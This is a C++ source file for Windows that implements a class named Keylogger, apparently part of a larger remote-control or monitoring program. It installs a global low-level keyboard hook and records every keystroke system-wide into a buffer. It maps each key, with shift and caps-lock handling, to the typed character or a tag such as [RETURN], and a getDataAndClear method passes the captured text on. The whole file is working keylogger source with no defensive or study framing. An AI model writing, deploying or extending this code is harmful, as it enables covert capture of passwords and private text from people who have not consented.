#include "KeyboardController.h"
#ifdef _WIN32

// Khởi tạo các biến static
HHOOK Keylogger::_hook = NULL;
vector<std::string> Keylogger::_buffer;
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.capacity() < _buffer.size() + 10) {
        _buffer.reserve(_buffer.size() * 2 + 256);
    }
    _buffer.push_back(str);
}

LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode;

        if (key == VK_RETURN) append("[RETURN]");
        else if (key == VK_TAB) append("[TAB]");
        else if (key == VK_SPACE) append(" ");
        else if (key == VK_BACK) append("[DELETE]");
        else if (key == VK_DELETE) append("[DEL]");
        else if (key == VK_ESCAPE) append("[ESC]");
        else if (key == VK_LWIN || key == VK_RWIN) append("[CMD]");
        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) append("[SHIFT]");
        else if (key == VK_CAPITAL) append("[CAPS]");
        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[OPT]");
        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
        else if (key == VK_LEFT) append("[LEFT]");
        else if (key == VK_RIGHT) append("[RIGHT]");
        else if (key == VK_UP) append("[UP]");
        else if (key == VK_DOWN) append("[DOWN]");
        else if (key == VK_HOME) append("[HOME]");
        else if (key == VK_END) append("[END]");
        else if (key == VK_PRIOR) append("[PGUP]");
        else if (key == VK_NEXT) append("[PGDN]");
        else if (key == VK_INSERT) append("[INS]");
        else if (key == VK_F1) append("[F1]");
        else if (key == VK_F2) append("[F2]");
        else if (key == VK_F3) append("[F3]");
        else if (key == VK_F4) append("[F4]");
        else if (key == VK_F5) append("[F5]");
        else if (key == VK_F6) append("[F6]");
        else if (key == VK_F7) append("[F7]");
        else if (key == VK_F8) append("[F8]");
        else if (key == VK_F9) append("[F9]");
        else if (key == VK_F10) append("[F10]");
        else if (key == VK_F11) append("[F11]");
        else if (key == VK_F12) append("[F12]");
        else if (key == VK_F13) append("[F13]");
        else if (key == VK_F14) append("[F14]");
        else if (key == VK_F15) append("[F15]");
        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
        else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
             BYTE keyState[256];
             if (GetKeyboardState(keyState)) {
                 bool isShift = (keyState[VK_SHIFT] & 0x80) != 0;
                 bool isCapsLock = (keyState[VK_CAPITAL] & 0x01) != 0;
                 
                 if (key >= 'A' && key <= 'Z') {
                     char c = (char)key;
                     if ((isShift && !isCapsLock) || (!isShift && isCapsLock)) {
                         append(std::string(1, c));
                     } else {
                         append(std::string(1, c + 32));
                     }
                 } else if (key >= '0' && key <= '9') {
                     char numChars[] = "0123456789";
                     char specialChars[] = ")!@#$%^&*(";
                     int index = key - '0';
                     if (isShift && index < 10) {
                         append(std::string(1, specialChars[index]));
                     } else {
                         append(std::string(1, numChars[index]));
                     }
                 }
             } else {
                 WCHAR unicodeChars[4] = {0};
                 BYTE fallbackKeyState[256] = {0};
                 if (GetKeyboardState(fallbackKeyState)) {
                     int result = ToUnicode(key, 0, fallbackKeyState, unicodeChars, 4, 0);
                     if (result > 0) {
                         std::wstring wstr(unicodeChars, result);
                         int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
                         if (size_needed > 0) {
                             std::string utf8Str(size_needed, 0);
                             WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
                             append(utf8Str);
                         } else {
                             append("[" + std::to_string(key) + "]");
                         }
                     } else {
                         append("[" + std::to_string(key) + "]");
                     }
                 } else {
                     append("[" + std::to_string(key) + "]");
                 }
             }
        }
        else {
             BYTE keyState[256];
             WCHAR unicodeChars[4] = {0};
             
             if (GetKeyboardState(keyState)) {
                 int result = ToUnicode(key, 0, keyState, unicodeChars, 4, 0);
                 
                 if (result > 0) {
                     std::wstring wstr(unicodeChars, result);
                     int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), NULL, 0, NULL, NULL);
                     if (size_needed > 0) {
                         std::string utf8Str(size_needed, 0);
                         WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.length(), &utf8Str[0], size_needed, NULL, NULL);
                         append(utf8Str);
                     } else {
                         WORD translated[2] = {0};
                         int asciiResult = ToAscii(key, 0, keyState, translated, 0);
                         if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
                             append(std::string(1, (char)translated[0]));
                         } else {
                             append("[" + std::to_string(key) + "]");
                         }
                     }
                 } else if (result == -1) {
                 } else {
                     WORD translated[2] = {0};
                     int asciiResult = ToAscii(key, 0, keyState, translated, 0);
                     if (asciiResult == 1 && translated[0] >= 32 && translated[0] <= 126) {
                         append(std::string(1, (char)translated[0]));
                     } else {
                         if (key == VK_OEM_1) append(";");
                         else if (key == VK_OEM_PLUS) append("=");
                         else if (key == VK_OEM_COMMA) append(",");
                         else if (key == VK_OEM_MINUS) append("-");
                         else if (key == VK_OEM_PERIOD) append(".");
                         else if (key == VK_OEM_2) append("/");
                         else if (key == VK_OEM_3) append("`");
                         else if (key == VK_OEM_4) append("[");
                         else if (key == VK_OEM_5) append("\\");
                         else if (key == VK_OEM_6) append("]");
                         else if (key == VK_OEM_7) append("'");
                         else {
                             append("[" + std::to_string(key) + "]");
                         }
                     }
                 }
             } else {
                 append("[" + std::to_string(key) + "]");
             }
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        MSG msg;
        while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        if (_hook) {
            UnhookWindowsHookEx(_hook);
            _hook = NULL;
        }
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (_workerThread.joinable()) {
        PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
        _workerThread.join();
    }
}

vector<std::string> Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    
    if (_buffer.empty()) {
        return {};
    }
    
    vector<std::string> result = std::move(_buffer);
    _buffer.clear();
    _buffer.reserve(256);
    
    return result;
}
#endif